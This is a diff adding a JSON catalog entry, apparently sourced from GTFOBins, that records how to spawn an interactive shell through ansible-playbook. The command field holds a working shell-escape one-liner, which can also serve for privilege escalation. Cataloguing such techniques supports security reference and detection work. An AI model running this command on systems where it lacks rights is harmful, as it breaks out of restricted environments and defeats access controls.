@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-ansible-playbook-shell",
+  "name": "GTFOBins · ansible-playbook (shell)",
+  "command": "echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >/path/to/temp-file\nansible-playbook /path/to/temp-file",
+  "description": "Use ansible-playbook to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "ansible-playbook",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/ansible-playbook/#shell",
+  "upstream_id": "ansible-playbook/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/ansible-playbook/"
+    }
+  ]
+}
